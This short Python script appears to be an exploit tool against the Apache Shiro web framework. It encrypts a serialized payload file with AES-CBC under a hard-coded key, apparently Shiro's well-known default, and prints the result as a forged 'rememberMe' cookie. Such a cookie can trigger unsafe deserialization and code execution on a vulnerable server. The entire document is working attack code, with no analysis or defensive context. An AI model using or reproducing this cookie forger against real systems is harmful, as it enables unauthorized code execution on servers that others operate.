import base64
from Crypto.Cipher import AES
import uuid

BS = AES.block_size
KEY = "kPH+bIxk5D2deZiIxcaaaA=="
FILEPATH = "payload.ser"

with open(FILEPATH, 'rb') as f:
    data = f.read()

def manual_pad(data):
    pad_len = BS - (len(data) % BS)
    if pad_len == 0:
        pad_len = BS
    pad = bytes([pad_len]) * pad_len
    return data + pad

iv = uuid.uuid4().bytes
b64key = base64.b64decode(KEY)
cipher = AES.new(b64key, AES.MODE_CBC, iv)

paddata = manual_pad(data)
encrypted = cipher.encrypt(paddata)

result = iv + encrypted
b64_result = base64.b64encode(result).decode()

print(f"rememberMe={b64_result}")